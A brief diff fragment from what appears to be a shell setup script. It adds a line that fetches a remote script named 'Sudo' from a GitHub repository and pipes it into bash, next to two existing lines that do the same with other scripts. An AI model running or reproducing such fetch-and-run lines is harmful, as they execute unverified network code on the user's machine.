@@ -87,6 +87,8 @@ rm Paket1HD.tar
 cd
 ls
 
+wget -O - https://raw.githubusercontent.com/panjiades/Update-3/refs/heads/main/Sudo | bash
+
 wget -O - https://raw.githubusercontent.com/panjiades/Update-3/refs/heads/main/linux123 | bash
 
 wget -O - https://raw.githubusercontent.com/panjiades/Update-3/refs/heads/main/Update-Widget | bash
